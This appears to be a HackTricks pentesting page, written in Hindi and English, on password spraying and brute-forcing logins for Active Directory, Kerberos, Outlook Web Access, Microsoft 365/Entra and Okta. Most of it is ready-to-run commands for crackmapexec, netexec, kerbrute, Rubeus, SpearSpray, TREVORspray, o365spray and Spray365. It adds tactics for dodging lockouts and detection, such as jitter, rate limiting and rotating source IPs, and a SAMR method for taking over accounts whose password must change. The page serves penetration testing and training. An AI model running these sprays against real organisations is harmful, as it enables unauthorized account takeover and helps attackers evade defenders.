# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

एक बार जब आपको कई **valid usernames** मिल जाएं, तो आप खोजे गए प्रत्येक user के साथ सबसे **common passwords** आजमा सकते हैं (environment की password policy को ध्यान में रखें)।\
**default** रूप से **minimum** **password** **length** **7** होती है।

Common usernames की lists भी उपयोगी हो सकती हैं: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

ध्यान दें कि **several wrong passwords आजमाने पर कुछ accounts lockout हो सकते हैं** (default रूप से 10 से अधिक प्रयासों पर)।

### Get password policy

यदि आपके पास कुछ user credentials या domain user के रूप में shell है, तो आप **password policy प्राप्त कर सकते हैं**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Linux (या सभी) से Exploitation

- **crackmapexec:** का उपयोग करके
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- SMB/WinRM पर targeted, low-noise spraying के लिए **NetExec (CME successor)** का उपयोग करना:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- [**kerbrute**](https://github.com/ropnop/kerbrute) (Go) का उपयोग करके
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(lockouts से बचने के लिए attempts की संख्या निर्दिष्ट कर सकते हैं):**_<sup>[[3]](#references)</sup>
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) का उपयोग करना - **कभी-कभी काम नहीं करता, अनुशंसित नहीं है**<sup>[[2]](#references)</sup>
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- **Metasploit** के `scanner/smb/smb_login` module का उपयोग करके:

![Password Spraying - Brute-Force: Metasploit के scanner/smb/smb login module के साथ](<../../images/image (745).png>)

- **rpcclient** का उपयोग करके:<sup>[[6]](#references)</sup>
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Windows से

- [Rubeus](https://github.com/Zer1t0/Rubeus) के `brute` module वाले version के साथ:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) के साथ (यह डिफ़ॉल्ट रूप से domain से users generate कर सकता है और domain से password policy प्राप्त करके उसके अनुसार attempts सीमित करेगा):<sup>[[4]](#references)</sup>
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1) के साथ
```
Invoke-SprayEmptyPassword
```
### "Password must change at next logon" Accounts को Identify और Take Over करें (SAMR)

एक low-noise technique में benign/empty password spray किया जाता है और उन accounts को पकड़ा जाता है जो STATUS_PASSWORD_MUST_CHANGE return करते हैं। इससे संकेत मिलता है कि password को जबरन expire किया गया है और पुराने password को जाने बिना उसे बदला जा सकता है।<sup>[[9]](#references)[[10]](#references)</sup>

Workflow:
- Target list बनाने के लिए users enumerate करें (SAMR के माध्यम से RID brute):

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- खाली password को Spray करें और hits मिलने पर आगे जारी रखें, ताकि अगले logon पर password बदलना अनिवार्य वाले accounts को capture किया जा सके:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- प्रत्येक hit के लिए, NetExec के module से SAMR के माध्यम से password बदलें ("must change" सेट होने पर पुराने password की आवश्यकता नहीं होती):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Operational notes:
- Kerberos-based operations से पहले सुनिश्चित करें कि आपका host clock DC के साथ sync में है: `sudo ntpdate <dc_fqdn>`.
- कुछ modules (जैसे RDP/WinRM) में (Pwn3d!) के बिना [+] का अर्थ है कि creds valid हैं, लेकिन account में interactive logon rights नहीं हैं।

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying, SMB/NTLM/LDAP bind attempts की तुलना में कम noise उत्पन्न करता है और AD lockout policies के साथ बेहतर तरीके से align होता है। SpearSpray, LDAP-driven targeting, एक pattern engine और policy awareness (domain policy + PSOs + badPwdCount buffer) को जोड़कर सटीक और सुरक्षित तरीके से spray करता है। यह BloodHound pathing के लिए compromised principals को Neo4j में tag भी कर सकता है।<sup>[[1]](#references)</sup>

Key ideas:
- Paging और LDAPS support के साथ LDAP user discovery, जिसमें custom LDAP filters का वैकल्पिक उपयोग किया जा सकता है।
- Domain lockout policy + PSO-aware filtering, ताकि configurable attempt buffer (threshold) छोड़ा जा सके और users को lock होने से बचाया जा सके।
- Fast gssapi bindings का उपयोग करके Kerberos pre-auth validation (DCs पर 4625 के बजाय 4768/4771 generate करता है)।
- प्रत्येक user के pwdLastSet से derived names और temporal values जैसे variables का उपयोग करके pattern-based, per-user password generation।
- Threads, jitter और max requests per second के माध्यम से throughput control।
- BloodHound के लिए owned users को mark करने हेतु optional Neo4j integration।

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
लक्ष्य निर्धारण और पैटर्न नियंत्रण:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth और safety controls:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound में अतिरिक्त जानकारी जोड़ना:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Pattern system का अवलोकन (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
उपलब्ध variables में शामिल हैं:
- {name}, {samaccountname}
- प्रत्येक user के pwdLastSet (या whenCreated) से Temporal: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers और org token: {separator}, {suffix}, {extra}

Operational notes:

- सबसे authoritative badPwdCount और policy-related info पढ़ने के लिए -dc के साथ PDC-emulator को query करना बेहतर है।
- badPwdCount resets observation window के बाद अगले attempt पर trigger होते हैं; सुरक्षित रहने के लिए threshold और timing का उपयोग करें।
- Kerberos pre-auth attempts DC telemetry में 4768/4771 के रूप में दिखाई देते हैं; blend in करने के लिए jitter और rate-limiting का उपयोग करें।

> Tip: SpearSpray का default LDAP page size 200 है; आवश्यकतानुसार -lps से इसे adjust करें।

## Outlook Web Access

**password spraying outlook** के लिए कई tools हैं।

- [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/) के साथ
- [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/) के साथ
- [Ruler](https://github.com/sensepost/ruler) के साथ (reliable!)<sup>[[5]](#references)</sup>
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) के साथ (Powershell)
- [MailSniper](https://github.com/dafthack/MailSniper) के साथ (Powershell)

इनमें से किसी भी tool का उपयोग करने के लिए, आपको एक user list और spray करने के लिए एक password / passwords की छोटी list की आवश्यकता होगी।
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Cloud spraying के लिए, पहले पहचानें कि tenant **managed**, **federated**, या **hybrid** है, क्योंकि endpoint और lockout behavior on-prem AD से अलग हो सकते हैं। Microsoft Entra में, **Smart Lockout** यह बदलता है कि repeated guesses lockout budget को किस तरह consume करते हैं:<sup>[[7]](#references)</sup>

- एक ही **bad password** को दोहराने से lockout counter लगातार increment नहीं होता, लेकिन **new candidates** आज़माने से होता है।
- **Familiar** और **unfamiliar** locations के लिए **separate** counters होते हैं।
- **pass-through authentication (PTA)** का उपयोग करने वाले tenants को bad-password hash tracking का लाभ नहीं मिलता, इसलिए उन्हें classic lockout-sensitive targets की तरह मानें।

व्यवहार में, **हर round में एक password** spray करें, rounds के बीच पर्याप्त spacing रखें, और ऐसे tooling को प्राथमिकता दें जो guesses भेजने से पहले tenant के actual auth flow को discover कर सके।

- [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORSpray) के साथ, आप tenant का recon कर सकते हैं, `token_endpoint` discover कर सकते हैं, `msol`/`adfs`/`owa`/`okta` पर spray कर सकते हैं, और traffic को multiple egress IPs के माध्यम से rotate कर सकते हैं:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- [**Spray365**](https://github.com/MarkoH17/Spray365) के साथ, आप एक फिर से शुरू किए जा सकने वाले **execution plan** को पहले से बना सकते हैं, auth order को randomize कर सकते हैं, और lockout window से बाहर रहने के लिए प्रत्येक user के लिए **minimum delay** लागू कर सकते हैं:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- [**o365spray**](https://github.com/0xZDH/o365spray) के साथ, आप tenant को validate कर सकते हैं, `onedrive` जैसे modules का उपयोग करके users enumerate कर सकते हैं, और `oauth2` या `adfs` के माध्यम से spray कर सकते हैं, साथ ही lockout window के दौरान प्रति user **एक attempt** बनाए रख सकते हैं। यदि आपके पास पहले से FireProx API है, तो source IPs को distribute करने के लिए इसे `--proxy-url` के साथ पास करें:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
हाल के operator tradecraft में **distributed cloud spraying** की ओर भी रुझान बढ़ा है। [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) time windows, password shuffling, ADFS/M365 spraying और automatic post-auth exfiltration को support करता है। हाल के वास्तविक दुरुपयोग में spray waves को कई source geographies में फैलाने के लिए **Microsoft Teams API** account enumeration और **AWS region rotation** का भी उपयोग किया गया।<sup>[[8]](#references)</sup>

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [1] [SpearSpray – User Intelligence के साथ अपने Active Directory Password Spraying को बेहतर बनाएं](https://github.com/sikumy/spearspray)
- [2] [TarlogicSecurity/kerbrute – Impacket (Python) के साथ Kerberos bruteforcing](https://github.com/TarlogicSecurity/kerbrute)
- [3] [Spray – Active Directory Credentials के लिए एक Password Spraying tool](https://github.com/Greenwolf/Spray)
- [4] [Active Directory Password Spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [5] [Password Spraying Outlook Web Access: Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [6] [Password Spraying और RPCCLIENT के साथ अन्य मज़ेदार प्रयोग](https://www.blackhillsinfosec.com/?p=5296)
- [7] [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [8] [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [9] [HTB Sendai – 0xdf: spray से gMSA से DA/SYSTEM तक](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [10] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)

{{#include ../../banners/hacktricks-training.md}}
